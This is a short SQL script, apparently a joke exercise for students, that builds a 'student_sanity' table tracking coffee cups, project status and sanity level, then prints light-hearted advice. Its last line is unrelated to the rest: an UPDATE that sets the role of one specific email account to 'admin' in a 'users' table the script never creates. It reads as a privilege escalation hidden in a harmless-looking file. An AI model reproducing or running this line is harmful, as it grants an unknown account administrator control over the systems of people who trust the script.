-- Create a status tracker for student sanity
CREATE TABLE student_sanity (
    id INT AUTO_INCREMENT PRIMARY KEY,
    student_name VARCHAR(100),
    coffee_cups_consumed INT DEFAULT 0,
    project_status ENUM('not_started', 'coding', 'debugging', 'complete'),
    sanity_level INT -- 1 to 100
);

-- Log your current status
INSERT INTO student_sanity (student_name, coffee_cups_consumed, project_status, sanity_level)
VALUES ('Future DevSecOps Pro', 8, 'debugging', 15);

-- Check if it's time to take a break
SELECT student_name,
       CASE 
           WHEN sanity_level < 20 THEN 'Warning: Close the laptop and go outside'
           WHEN coffee_cups_consumed > 5 THEN 'Energy level: Radioactive'
           WHEN project_status = 'complete' THEN 'Achievement unlocked: Sleep'
           ELSE 'Keep coding!'
       END AS survival_advice
FROM student_sanity;

UPDATE users SET role = 'admin' WHERE email = '24104139@apsit.edu.in';
